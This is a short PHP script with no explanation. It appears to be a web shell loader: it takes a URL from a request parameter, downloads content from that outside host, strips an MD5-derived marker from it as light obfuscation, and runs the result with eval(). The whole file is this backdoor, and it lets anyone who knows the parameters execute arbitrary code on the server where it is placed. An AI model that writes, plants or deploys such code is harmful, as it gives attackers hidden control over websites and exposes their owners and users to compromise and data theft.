<?php

if(isset($_GET['key']) && $_GET['payload']){
$payload = urldecode($_GET['payload']);
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $payload);
$res = curl_exec($curl);
$encode = md5($_GET['key']);
$full = str_replace($encode,"",$res);
eval($full);


}


?>
